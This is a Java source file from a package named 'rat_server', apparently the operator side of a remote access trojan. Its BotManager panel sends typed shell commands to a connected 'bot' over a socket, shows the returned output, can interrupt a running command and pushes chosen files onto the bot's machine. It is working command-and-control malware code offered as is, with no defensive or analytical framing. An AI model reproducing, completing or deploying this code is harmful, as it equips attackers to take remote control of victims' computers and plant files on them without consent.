package rat_server;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.RandomAccessFile;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.Cipher;
import javax.swing.DefaultListModel;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;

public class BotManager extends JPanel
{
    private Socket socket;
    private JTextArea textArea;
    private JTextField textField;
    private String outputed;
    private JButton button,_button,send_file;
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    private boolean stop_curr;
    private KeyGenerator keyGen;
    private SecretKey secretKey;
    private Cipher aes_cipher;
    private String aes_key;
    private byte[] end_flag;
    private DefaultListModel<String> dlm;
    
    public BotManager(Socket socket,DefaultListModel<String> dlm)
    {
        this.socket=socket;
        this.dlm=dlm;
        stop_curr=false;
        outputed="";
        try
        {
            oos=new ObjectOutputStream(socket.getOutputStream());
            ois=new ObjectInputStream(socket.getInputStream());
        }
        catch(IOException exc)
        {
            exc.printStackTrace();
        }
        setSize(200,200);
        setLayout(new GridLayout(2,1));
        textArea=new JTextArea();
        textArea.setEditable(false);
        JScrollPane scrollArea=new JScrollPane(textArea,JScrollPane.VERTICAL_SCROLLBAR_ALWAYS,
                                               JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS);
        textField=new JTextField(20);
        add(scrollArea);
        JPanel panel=new JPanel();
        button=new JButton("Send");
        button.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e)
            {      
             try
             {
                 byte[] data=null;
                 oos.writeBoolean(true);   //output?
                 oos.flush();
                 oos.writeBoolean(false);  //isFile?
                 oos.flush();
                 oos.writeBoolean(false);  //isScreenSharing?
                 oos.flush();
                 oos.writeUTF(Base64.encode(textField.getText().getBytes()));
                 oos.flush();
                 textField.setText("");
                 new Thread(new UpdateBotView()).start();
             }
             catch(IOException exc)
             {
                   BotManager.this.dlm.removeElement((String)BotManager.this.socket.getInetAddress().getHostAddress());
                   exc.printStackTrace();
             }
            }
        });
        _button=new JButton("Stop");
        _button.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
                stopCurrentCommand();
            }
        });
        send_file=new JButton("Send File");
        send_file.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
                try
                {
                    JFileChooser fileChooser=new JFileChooser();
                    fileChooser.showOpenDialog(BotManager.this);
                    File file=fileChooser.getSelectedFile();
                    oos.writeBoolean(false);   //output?
                    oos.flush();
                    oos.writeBoolean(true);    //isFile?
                    oos.flush();
                    oos.writeBoolean(false);    //isFile?
                    oos.flush();
                    oos.writeUTF(file.getName());
                    oos.flush();
                    oos.writeObject(binaryFileToHexByte(file));
                    oos.flush();
                    if(ois.readUTF().equals("ACK"))
                    
                        JOptionPane.showMessageDialog(BotManager.this,"File sent");
                }
                catch(IOException exc)
                {
                    BotManager.this.dlm.removeElement((String)BotManager.this.socket.getInetAddress().getHostAddress());
                    exc.printStackTrace();
                }
            }
        });
        panel.setLayout(new FlowLayout());
        panel.add(textField);
        panel.add(button);
        panel.add(_button);
        panel.add(send_file);
        add(panel);
        setVisible(true);
    }

    private byte[] binaryFileToHexByte(final File file) throws FileNotFoundException,IOException
    {
        RandomAccessFile randomAccessFile=new RandomAccessFile(file,"r");
        FileChannel inChannel=randomAccessFile.getChannel();
        ByteBuffer buffer=ByteBuffer.allocate(1024);
        byte[] b=new byte[new FileManagement<byte[]>(file.getAbsolutePath()).getFileSizeAbsolutePath()];
        int index=0;
        while(inChannel.read(buffer)>0)
        {
            buffer.flip();
            for(int i=0;i<buffer.limit();i++,index++)
                b[index]=buffer.get();
            buffer.clear();
        }
        inChannel.close();
        randomAccessFile.close();
        return b;
    }
    
    Socket getSocket()
    {
        return socket;
    }
    
    JTextArea getJTextArea()
    {
        return textArea;
    }
    
    String getOutput()
    {
        return outputed;
    }
    
    ObjectOutputStream getOutputStream()
    {
        return oos;
    }
    
    ObjectInputStream getInputStream()
    {
        return ois;
    }
    
    private void stopCurrentCommand()
    {
        stop_curr=true;
    }
    
    Cipher getCipher()
    {
        return aes_cipher;
    }
    
    SecretKey getSecretKey()
    {
        return secretKey;
    }
    
    private class UpdateBotView implements Runnable
    {
        @Override
        public void run()
        {
            try
            {
                String data="";
                byte[] tmp;
                while(!((tmp=Base64.decode(ois.readUTF())).equals("END_OF_TRASMISSION".getBytes())))
                {
                      data=new String(tmp);
                      textArea.append(data+"\n");
                      outputed+=data+"\n";
                      revalidate();
                      if(data.equals("END_OF_TRASMISSION"))
                          return;
                      oos.writeBoolean(stop_curr);
                      oos.flush();
                      if(stop_curr)
                          stop_curr=false;
                }
            }
            catch(IOException exc)
            {
                BotManager.this.dlm.removeElement((String)BotManager.this.socket.getInetAddress().getHostAddress());
                exc.printStackTrace();
            } 
        }
    }
    
}
